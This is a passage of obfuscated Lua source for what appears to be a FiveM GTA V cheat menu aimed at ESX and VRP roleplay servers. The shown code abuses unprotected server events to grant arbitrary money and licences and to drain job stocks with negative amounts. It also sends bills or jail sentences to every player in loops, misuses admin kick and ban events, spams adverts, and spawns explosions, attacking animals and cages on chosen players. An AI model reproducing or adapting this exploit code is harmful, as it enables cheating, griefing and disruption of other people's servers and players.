                    TriggerServerEvent('esx_taxijob:success')
                    TriggerServerEvent('esx_taxijob:success')
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~esx_garbagejob") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_garbagejob:pay", result)
                end 
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~paycheck") then
                for i = 1, 20 do
                    TriggerServerEvent('paycheck:salary')
                end
            elseif PowerFulSokin.sadh78asd7asgda("~s~Bank ~r~~h~Deposit") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
                TriggerServerEvent("bank:deposit", result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~s~Bank ~r~~h~Withdraw ") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
                TriggerServerEvent("bank:withdraw", result)
                end
            end


            PowerFulSokin.sadha7sxzsa()
                elseif PowerFulSokin.asdy7as12("ESXMisc") then
                    if PowerFulSokin.sadh78asd7asgda("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
                end
                elseif PowerFulSokin.sadh78asd7asgda("~g~~h~ESX ~w~Get all licenses Drive") then
                    TriggerServerEvent('esx_dmvschool:addLicense', dmv)
                    TriggerServerEvent('esx_dmvschool:addLicense', drive)
                    TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
                    TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
                    TriggerServerEvent("dmv:success")
                                elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Brinks Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_brinks:getStockItem',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Mechanic Job') then
                    local eu = KeyboardInput('Enter Item Name', '', 100)
                    if eu then
                        local db = KeyboardInput('Enter Amount', '', 100)
                        if db then
                            TriggerServerEvent(
                                'esx_mechanicjob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Police Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_policejob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Taxi Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_taxijob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Unicorn Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_unicornjob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~VehicleShop') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_vehicleshop:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Admin Tool') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                    local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                        TriggerServerEvent(
                        'esx_adminjob:putStockasdgas68dgas7das', 
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Cartle Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_carteljob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~MC Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_thelostmcjob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Gang Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_gangjob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Bloods Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_bloodsjob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Lost Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_lostmcjob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Mafia Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_mafiajob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Taliban Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                            TriggerServerEvent(
                                'esx_talibanjob:putStockasdgas68dgas7das',
                        a, 
                        -b
                        )
                        end
                    end
                end
                

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("MiscServerOptions") then
                if PowerFulSokin.sadh78asd7asgda("~h~Send Discord Message") then
                    local Message = KeyboardInput("Enter message to send", "", 100)
                    TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
                    drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
                elseif PowerFulSokin.sadh78asd7asgda("~h~Send Police Car Advert") then
                TriggerServerEvent("esx:enterpolicecar",Getsadha7sxzsaNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("VRPOptions") then
                if PowerFulSokin.sadh78asd7asgda("~r~~h~VRP ~s~Give Money ~y~payGarage") then
                    local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
                    if result then
                        TriggerServerEvent("lscustoms:payGarage", {costs = -result})
                    end     
                elseif PowerFulSokin.sadh78asd7asgda("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
                    local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
                    if result then
                    TriggerServerEvent("vrp_slotmachine:server:2", result)
                    end
                elseif PowerFulSokin.sadh78asd7asgda("~r~~h~VRP ~s~Get driving license") then
                    TriggerServerEvent("dmv:success")
                elseif PowerFulSokin.sadh78asd7asgda("~r~~h~VRP ~s~Bank Deposit") then
                    local result = KeyboardInput("Enter amount of money", "", 100)
                    if result then
                    TriggerServerEvent("bank:deposit", result)
                    end
                elseif PowerFulSokin.sadh78asd7asgda("~r~~h~VRP ~s~Bank Withdraw ") then
                    local result = KeyboardInput("Enter amount of money", "", 100)
                    if result then
                    TriggerServerEvent("bank:withdraw", result)
                    end
            end


                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("ESXDrugs") then
                if PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~g~AndreasRP") then
                    for i = 0, 128 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~AquaCityRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "+48793014856 Dzwoncie!!!", 13371337)
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~HellGateRP") then
                    for i = 0, 128 do
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~CityRP.xyz") then
                    for i = 1, 5 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~BruklinRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~MangoRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startSellCoke")
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~GalaxyRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~LimitRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~OsiedleRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startSellMeth")
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~CamorraRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~BoskieRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Jail ~c~[nazwa server]") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startSellOpium")
                end
                elseif PowerFulSokin.sadh78asd7asgda("Jail All SKRT") then
                    TriggerServerEvent("esx_drugs:stopHarvestCoke")
                    TriggerServerEvent("esx_drugs:stopTransformCoke")
                    TriggerServerEvent("esx_drugs:stopSellCoke")
                    TriggerServerEvent("esx_drugs:stopHarvestMeth")
                    TriggerServerEvent("esx_drugs:stopTransformMeth")
                    TriggerServerEvent("esx_drugs:stopSellMeth")
                    TriggerServerEvent("esx_drugs:stopHarvestWeed")
                    TriggerServerEvent("esx_drugs:stopTransformWeed")
                    TriggerServerEvent("esx_drugs:stopSellWeed")
                    TriggerServerEvent("esx_drugs:stopHarvestOpium")
                    TriggerServerEvent("esx_drugs:stopTransformOpium")
                    TriggerServerEvent("esx_drugs:stopSellOpium")
                    drawNotification("~r~Everything is now stopped.")
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117") then
                    for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and PowerFulSokin.saidhas78dhas(GetPlayerName(i).." ID = [~r~"..GetPlayerServerId(i).."~s~]"..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~ DEAD" or "~g~ ALIVE"), "PlayerOptionsMenu") then
                        SelectedPlayer = i
                    end
                end
        

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("PlayerOptionsMenu") then
                PowerFulSokin.dasdjas78dhasd("PlayerOptionsMenu", "~h~Player ~s~[" .. GetPlayerName(SelectedPlayer) .. "]")
                if PowerFulSokin.sadh78asd7asgda("Spectate", (Spectating and "~r~[SPECTATING]")) then
                    SpectatePlayer(SelectedPlayer)
                elseif PowerFulSokin.sadh78asd7asgda("Teleport To Player") then
                    local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                    SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                elseif PowerFulSokin.sadh78asd7asgda("~g~Give ~s~Money") then
                        local result = KeyboardInput("Enter amount of money to give", "", 100000000)
                        if result then
                        TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
                        end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Spawn ~h~~o~Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif PowerFulSokin.sadh78asd7asgda('~h~~g~Heal ~s~Player') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = GetHashKey(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Cage ~w~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif PowerFulSokin.saidhas78dhas('∑~h~~r~~w~ Spawn Menu', 'SpawnPeds') then
                elseif PowerFulSokin.saidhas78dhas('∑~h~~b~Ram Vehicle Options', 'VehicleRamMenu') then
                elseif PowerFulSokin.saidhas78dhas("∑~h~~r~Spawn Props On Player", "SpawnPropsMenu") then
                elseif PowerFulSokin.saidhas78dhas("∑~h~~r~ESX Triggers", "ESXTriggers") then
                elseif PowerFulSokin.sadh78asd7asgda("~r~Remove ~s~Money") then
                        local result = KeyboardInput("Enter amount of money to give", "", 100000000)
                        if result then
                        TriggerServerEvent('esx:removeInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
                        end
                elseif PowerFulSokin.sadh78asd7asgda('~h~~p~change your clothes') then
                        ClonePedlol(SelectedPlayer)
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Give ~o~All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                elseif PowerFulSokin.sadh78asd7asgda('~h~Remove ~r~All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Airstrike") then
                AirstrikePlayer(SelectedPlayer)
                elseif PowerFulSokin.sadh78asd7asgda("~h~~o~Small invisible ~r~Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif PowerFulSokin.sadh78asd7asgda("~r~Explode") then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
                elseif PowerFulSokin.sadh78asd7asgda("Give ~b~Armor ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) 
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 33, 101.0, false, true, 0.0)
                --AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Fake Sniper") then
                Fakesniper(SelectedPlayer)
                elseif PowerFulSokin.sadh78asd7asgda("~h~~b~Taze Player") then
                TazePlayer(SelectedPlayer)
                elseif PowerFulSokin.sadh78asd7asgda('Fire') then
                    FirePlayer(SelectedPlayer)
                elseif PowerFulSokin.saidhas78dhas("Weapon Menu", "SingleWepPlayer") then
                elseif PowerFulSokin.sadh78asd7asgda("Spawn Vehicle") then
                    local ped = GetPlayerPed(SelectedPlayer)
                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end

                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                    else
                        drawNotification("~r~Model is not valid!")
                    end
                elseif PowerFulSokin.sadh78asd7asgda("Kick Vehicle") then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif PowerFulSokin.sadh78asd7asgda("Teleport To Player and kick from vehicle") then
                    local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                    SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                    end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12('ESXTriggers') then
                if PowerFulSokin.sadh78asd7asgda('~h~~g~Open Inventory HUD') then
                    TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
                elseif PowerFulSokin.sadh78asd7asgda("~g~Revive ~g~ESX") then
                    TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))  
                elseif PowerFulSokin.sadh78asd7asgda("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) 
                elseif PowerFulSokin.sadh78asd7asgda("Cuff ~g~ESX") then
                    TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(SelectedPlayer))
                    TriggerServerEvent("esx_policejob:handcuffhype", GetPlayerPed(SelectedPlayer))
                elseif PowerFulSokin.sadh78asd7asgda("~r~MelloTrainer ~s~KILL") then
                    TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
                elseif PowerFulSokin.sadh78asd7asgda("~r~MelloTrainer ~s~BAN") then
                    TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
                elseif PowerFulSokin.sadh78asd7asgda("~r~MelloTrainer ~s~KICK") then
                    TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: You have been kicked from the server." )
                    TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "YOU GAY" )
                elseif PowerFulSokin.sadh78asd7asgda("Jail") then      
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
                TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
                TriggerServerEvent("esx_jailler:wyslijwiezienie", GetPlayerServerId(SelectedPlayer), 1, "jd", 1)
                TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "dude weed")
                TriggerServerEvent("esx-qalle-jail:prisonbreak", GetPlayerServerId(SelectedPlayer), 100, "beka beka w chuj")
                TriggerServerEvent("esx_jailer:sendToJail23239", GetPlayerServerId(i), 100000, "https://sokin.xyz/", 100000)
                TriggerServerEvent("esx_jvamesACailer:sendToJail132", GetPlayerServerId(i), 100000, "https://sokin.xyz/", 100000)
                TriggerServerEvent("dreamrpjail:jailPlayerdreamrp", GetPlayerServerId(closestPlayer), jailTime, reason)
                TriggerServerEvent("esx_jailer:sendToJailhype2", GetPlayerServerId(i), 454368438 * 60, "https://sokin.xyz/", 54485748)
                elseif PowerFulSokin.sadh78asd7asgda("Unjail") then
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
                TriggerServerEvent("esx_jailer:wyslijwiezienie", GetPlayerServerId(SelectedPlayer), -1)
                TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
                TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
                TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))
                elseif PowerFulSokin.sadh78asd7asgda('~h~Send To ~r~Community Service') then
                    TriggerServerEvent('esx_communityservice:sendToCommunityService', GetPlayerServerId(SelectedPlayer), 60)
                elseif PowerFulSokin.sadh78asd7asgda('~h~~g~Evade ~s~From ~r~Community Service') then
                    TriggerServerEvent('esx_communityservice:endCommunityServiceCommand', GetPlayerServerId(SelectedPlayer))
                elseif PowerFulSokin.sadh78asd7asgda("~r~Change name ~g~ESX") then
                local FirstName = FM.GetKeyboardInput("Enter FirstName", "", 50)
                local LastName = FM.GetKeyboardInput("Enter LastName", "", 50)
                                if ESX ~= nil then
                    ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)
                        local xPlayer = nil
                        for i = 1, #players do
                            if players[i].name == GetPlayerName(SelectedPlayer) then xPlayer = players[i] end
                        end

                        if xPlayer ~= nil then
                            local data = {
                                identifier  = xPlayer.identifier,
                                firstname   = FirstName,
                                lastname    = LastName
                            }
                            local myidentifiers = { steamid = xPlayer.identifier }
                            FM.TriggerCustomEvent(true, 'esx_identity:setIdentity', data, myidentifiers)
                            Citizen.Wait(500)
                        else
                            FM.Notify("No Player Found", NotificationType.Error)
                        end
                    end)
                end
            end

                    PowerFulSokin.sadha7sxzsa()
                elseif PowerFulSokin.asdy7as12("SpawnPropsMenu") then
                    if PowerFulSokin.asdnjasj9asdljasdu(
                        "Attach Prop To Player",
                        attachProp,
                        function(hasdh8ay)
                            attachProp = hasdh8ay
                        end)
                    then
                    elseif PowerFulSokin.asidhas89dg("Bone", { "Head", "Right Hand" }, asdja7sdasd, asdh8asdh, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                        asdja7sdasd = yagsd7asgd7asgdasd
                        asdh8asdh = saudygasuydguasdasd
                    end)
                    then
                    elseif PowerFulSokin.sadh78asd7asgda("Pudelko") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_boxpile_07d"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end 
                    elseif PowerFulSokin.sadh78asd7asgda("Kolczatki") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("p_ld_stinger_s"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("wheel") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("stt_prop_ramp_adj_loop"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("prop_abat_roller_static") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_abat_roller_static"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                   elseif PowerFulSokin.sadh78asd7asgda("ramp1") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_skate_flatramp"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                   elseif PowerFulSokin.sadh78asd7asgda("ramp2") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_skate_funbox"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif asdh8asdh == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                   elseif PowerFulSokin.sadh78asd7asgda("ramp3") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_skate_halfpipe"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if asdh8asdh == 1 then
